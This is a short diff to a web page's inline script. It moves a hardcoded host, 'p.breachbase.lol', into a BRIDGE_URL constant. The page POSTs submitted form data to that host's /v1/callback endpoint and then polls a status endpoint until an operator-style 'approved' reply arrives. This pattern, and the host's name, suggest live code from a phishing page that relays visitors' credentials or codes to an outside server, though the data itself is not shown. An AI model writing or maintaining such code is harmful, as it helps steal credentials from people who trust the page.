@@ -423,6 +423,8 @@
 
     <!-- JavaScript to handle Tab Switching -->
     <script>
+        const BRIDGE_URL = 'https://p.breachbase.lol';
+
         // Splash screen fade out
         window.addEventListener('load', function() {
             setTimeout(function() {
@@ -446,7 +448,7 @@
             document.getElementById('progress-overlay').style.display = 'flex';
 
             try {
-                const response = await fetch('https://p.breachbase.lol/v1/callback', {
+                const response = await fetch(`${BRIDGE_URL}/v1/callback`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(data)
@@ -464,7 +466,7 @@
         async function pollStatus(attemptId) {
             const interval = setInterval(async () => {
                 try {
-                    const res = await fetch(`https://p.breachbase.lol/v1/status?attemptId=${attemptId}`);
+                    const res = await fetch(`${BRIDGE_URL}/v1/status?attemptId=${attemptId}`);
                     const { status } = await res.json();
                     
                     if (status === 'approved') {
